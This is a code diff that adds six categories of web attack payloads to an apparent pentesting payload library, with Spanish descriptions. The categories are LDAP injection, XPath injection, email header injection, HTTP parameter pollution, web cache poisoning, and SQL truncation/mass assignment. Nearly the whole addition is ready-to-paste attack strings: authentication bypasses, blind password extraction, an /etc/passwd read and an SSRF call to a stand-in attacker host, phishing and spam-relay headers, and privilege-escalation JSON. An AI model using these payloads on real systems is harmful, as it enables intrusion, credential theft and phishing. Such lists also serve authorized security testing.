@@ -1254,6 +1254,255 @@ export const raceConditions: PayloadCategory = {
   ],
 }
 
+export const ldapInjection: PayloadCategory = {
+  title: "LDAP Injection",
+  description: "Bypass de autenticación y enumeración de directorios LDAP/Active Directory mediante filtros maliciosos",
+  tag: "LDAP Injection",
+  tagColor: "bg-blue-500/10 text-blue-400 border-blue-500/20",
+  payloads: [
+    // Auth bypass básico
+    `*`,
+    `*)(&`,
+    `*)(uid=*))(|(uid=*`,
+    `*)(|(password=*`,
+    `admin)(&)`,
+    `admin)(|(uid=*`,
+    `)(|(uid=*`,
+    `*)(uid=admin)(&(uid=*`,
+    // En formulario de login (usuario / contraseña)
+    `*)(uid=*))(|(uid=*`,
+    `*()|%26'`,
+    `*()|&'`,
+    `*)%00`,
+    // Bypass con objectClass
+    `*)(objectClass=*`,
+    `*)(objectClass=person`,
+    `*)(objectClass=user`,
+    // Enumeración ciega (blind LDAP)
+    `admin*`,
+    `a*`,
+    `ad*`,
+    `adm*`,
+    `)(cn=*`,
+    `)(sn=*`,
+    // DN injection
+    `admin, dc=example, dc=com`,
+    `cn=admin, dc=example, dc=com)(userPassword=*`,
+    // Null byte bypass
+    "admin\x00",
+    "admin\\00",
+    // AND/OR injection
+    `admin)(&(objectClass=*`,
+    `admin)(|(objectClass=user)(objectClass=*`,
+    // Atributos sensibles
+    `*)(|(userPassword=*`,
+    `*)(|(mail=*`,
+    `*)(|(memberOf=*`,
+  ],
+}
+
+export const xpathInjection: PayloadCategory = {
+  title: "XPath Injection",
+  description: "Bypass de autenticación y extracción de datos en aplicaciones que usan XPath para consultar XML",
+  tag: "XPath Injection",
+  tagColor: "bg-teal-500/10 text-teal-400 border-teal-500/20",
+  payloads: [
+    // Auth bypass básico
+    `' or '1'='1`,
+    `' or '1'='1'--`,
+    `' or 1=1 or ''='`,
+    `" or "1"="1`,
+    `" or 1=1 or ""="`,
+    `') or ('1'='1`,
+    `') or (1=1) or ('1'='1`,
+    `' or ''='`,
+    `' or 'x'='x`,
+    `x' or 1=1 or 'x'='y`,
+    // Comentarios
+    `admin' or 1=1 or 'admin`,
+    `admin']%00`,
+    `admin'--`,
+    // Boolean blind (inferir carácter a carácter)
+    `' and string-length(//user[1]/password)=8 and '1'='1`,
+    `' and substring(//user[1]/password,1,1)='a' and '1'='1`,
+    `' and substring(//user[username='admin']/password,1,1)='a' and '1'='1`,
+    // Extracción via count()
+    `' and count(//user)=1 and '1'='1`,
+    `' and count(//user)>5 and '1'='1`,
+    // Extracción via string-length()
+    `' and string-length(//user[1]/username)>3 and '1'='1`,
+    // Acceso a nodos arbitrarios
+    `'] | //user/* | //foo['`,
+    `']/parent::*/child::* | //foo['`,
+    // doc() para LFI via XPath
+    `' and doc('file:///etc/passwd') and '1'='1`,
+    `' or doc('http://ATTACKER.com/ssrf') or '1'='1`,
+    // Leer todos los valores
+    `' or 1=1]/parent::*/descendant::text() | //a['`,
+  ],
+}
+
+export const emailHeaderInjection: PayloadCategory = {
+  title: "Email Header Injection",
+  description: "Inyección de cabeceras SMTP para spam relay, CC/BCC arbitrario y phishing via campos de formulario",
+  tag: "Email Injection",
+  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
+  payloads: [
+    // CC injection en campo From/To
+    `victim@target.com%0aCc:attacker@evil.com`,
+    `victim@target.com%0d%0aCc:attacker@evil.com`,
+    `victim@target.com\r\nCc:attacker@evil.com`,
+    `victim@target.com\nCc:attacker@evil.com`,
+    // BCC injection
+    `victim@target.com%0aBcc:attacker@evil.com`,
+    `victim@target.com%0d%0aBcc:attacker@evil.com`,
+    // Multiple recipients
+    `victim@target.com%0aTo:spam1@evil.com%0aTo:spam2@evil.com`,
+    // Subject injection
+    `victim@target.com%0aSubject:Phishing Subject Here`,
+    // Body injection
+    `victim@target.com%0a%0aInjected email body here`,
+    // From injection
+    `%0aFrom:spoofed@evil.com`,
+    `%0d%0aFrom:spoofed@evil.com`,
+    // MIME injection
+    `victim@target.com%0aContent-Type:text/html%0a%0a<h1>Phishing</h1>`,
+    // Reply-To poisoning
+    `victim@target.com%0aReply-To:attacker@evil.com`,
+    // Relay spam via injection
+    `nobody@example.com%0aTo:victim@target.com%0aFrom:spoofed@bank.com%0aSubject:Account Alert%0a%0aClick here...`,
+    // En campo "name" del formulario de contacto
+    `John Doe\r\nBcc:attacker@evil.com`,
+    `John Doe\nCc:spam@evil.com`,
+    // SMTP command injection
+    `test@test.com\r\nRCPT TO:<attacker@evil.com>`,
+    `test@test.com%0d%0aDATA%0d%0aFrom: spoofed@bank.com%0d%0a.`,
+  ],
+}
+
+export const httpParameterPollution: PayloadCategory = {
+  title: "HTTP Parameter Pollution (HPP)",
+  description: "Duplicar parámetros para confundir WAF/backend, bypass de validaciones y manipulación de lógica",
+  tag: "HPP",
+  tagColor: "bg-orange-500/10 text-orange-400 border-orange-500/20",
+  payloads: [
+    // Duplicar param — diferente interpretación por servidor
+    `id=1&id=2`,
+    `id=1&id=1&id=1`,
+    `id=legitimate&id=malicious`,
+    `role=user&role=admin`,
+    `admin=false&admin=true`,
+    `action=view&action=delete`,
+    // Array notation
+    `id[]=1&id[]=2`,
+    `user[role]=admin`,
+    `user[admin]=1`,
+    `param[0]=val1&param[1]=val2`,
+    // Separator bypass
+    `id=1;id=2`,
+    `id=1%26id=2`,
+    `id=1%3bid=2`,
+    // HPP en rutas
+    `/api/user?id=1&id=99`,
+    `/search?q=safe&q=<script>alert(1)</script>`,
+    // WAF bypass via HPP (el WAF analiza el primero, backend usa el segundo)
+    `search=legitimate&search=' OR 1=1--`,
+    `token=VALID_TOKEN&token=FORGED_TOKEN`,
+    `amount=100&amount=1`,
+    `redirect=https://target.com&redirect=https://evil.com`,
+    // HPP en headers (algunos frameworks)
+    `X-Forwarded-For: 127.0.0.1, X-Forwarded-For: attacker_ip`,
+    // Encoded duplicates
+    `id=1&%69%64=2`,
+    `id=1&Id=2&iD=99`,
+    // OAuth HPP
+    `client_id=REAL&client_id=ATTACKER&redirect_uri=https://target.com/callback`,
+    // JSON HPP
+    `{"id":1,"id":99}`,
+    `{"role":"user","role":"admin"}`,
+  ],
+}
+
+export const cachePoisoning: PayloadCategory = {
+  title: "Web Cache Poisoning",
+  description: "Envenenamiento de caché via headers no cacheados, fat GET, param cloaking y cache deception",
+  tag: "Cache Poisoning",
+  tagColor: "bg-indigo-500/10 text-indigo-400 border-indigo-500/20",
+  payloads: [
+    // Headers unkeyed clásicos — probar en cada request
+    `X-Forwarded-Host: ATTACKER.com`,
+    `X-Forwarded-Scheme: http`,
+    `X-Forwarded-Proto: http`,
+    `X-Host: ATTACKER.com`,
+    `X-Original-URL: /admin`,
+    `X-Rewrite-URL: /admin`,
+    `X-Forwarded-Port: 1337`,
+    `X-Forwarded-For: 127.0.0.1`,
+    `X-Real-IP: 127.0.0.1`,
+    `X-Custom-IP-Authorization: 127.0.0.1`,
+    `X-Original-Host: ATTACKER.com`,
+    `Forwarded: host=ATTACKER.com`,
+    // Cache buster — agregar param random para no romper caché real
+    `/?cb=1234  (cache buster para testing)`,
+    // Fat GET — body en request GET
+    `GET /?param=cached HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\n\r\nparam=poisoned&other=ignored`,
+    // Param cloaking (separadores alternativos)
+    `GET /?keyed_param=1;unkeyed_param=poisoned`,
+    `GET /?keyed_param=1&_unkeyed=poisoned`,
+    // Cache deception — forzar caché de página dinámica
+    `/account/settings/nonexistent.css`,
+    `/account/settings/static.jpg`,
+    `/profile/../../../account/settings`,
+    // Header injection en respuesta cacheada
+    `X-Forwarded-Host: attacker.com"><script>alert(1)</script>`,
+    // Vary header bypass
+    `Accept-Language: en-US,en;q=0.5  (si Vary: Accept-Language pero no se normaliza)`,
+    `Accept-Encoding: gzip, gzip  (header duplicado)`,
+    // CDN-specific
+    `Pragma: akamai-x-cache-on`,
+    `Pragma: akamai-x-get-cache-key`,
+    `X-Cache-Key: /poisoned`,
+  ],
+}
+
+export const sqlTruncation: PayloadCategory = {
+  title: "SQL Truncation & Mass Assignment",
+  description: "Bypass de límites de longitud en BD, creación de usuarios duplicados y asignación masiva en APIs REST",
+  tag: "SQL Truncation",
+  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
+  payloads: [
+    // SQL Truncation — registro con username truncado
+    `admin                                                  x`,
+    `admin@target.com                                       x@y.com`,
+    // Concepto: MySQL trunca VARCHAR(20) → "admin" + spaces == "admin"
+    `Username: "admin   " + 100 spaces + "attacker"  →  truncado a "admin"`,
+    `Email: "admin@target.com   " + spaces  →  truncado, choca con admin existente`,
+    // Password reset via truncation
+    `Registrar: "admin@target.com  " (con espacios)  →  resetear contraseña del admin real`,
+    // Mass Assignment — campos extra en JSON/form
+    `{"username":"user","password":"pass","role":"admin"}`,
+    `{"username":"user","password":"pass","isAdmin":true}`,
+    `{"username":"user","password":"pass","admin":1}`,
+    `{"username":"user","password":"pass","verified":true}`,
+    `{"username":"user","password":"pass","credits":99999}`,
+    `{"username":"user","password":"pass","plan":"enterprise"}`,
+    `{"username":"user","password":"pass","balance":10000}`,
+    // Rails mass assignment via query params
+    `POST /users?user[role]=admin`,
+    `POST /users?user[admin]=true`,
+    `POST /profile?user[is_admin]=1`,
+    // Node.js / Express mass assignment
+    `{"__proto__":{"admin":true},"username":"user","password":"pass"}`,
+    // Django mass assignment
+    `{"username":"user","password":"pass","is_staff":true,"is_superuser":true}`,
+    // Bypass email verification
+    `{"email":"attacker@evil.com","email_verified":true}`,
+    `{"email":"attacker@evil.com","confirmed":true}`,
+    // Laravel fillable bypass
+    `{"name":"user","password":"pass","role_id":1}`,
+  ],
+}
+
 export const allPayloadCategories: PayloadCategory[] = [
   sqliClassic,
   sqliUnionBased,
@@ -1289,4 +1538,10 @@ export const allPayloadCategories: PayloadCategory[] = [
   oauthAttacks,
   websocketAttacks,
   raceConditions,
+  ldapInjection,
+  xpathInjection,
+  emailHeaderInjection,
+  httpParameterPollution,
+  cachePoisoning,
+  sqlTruncation,
 ]
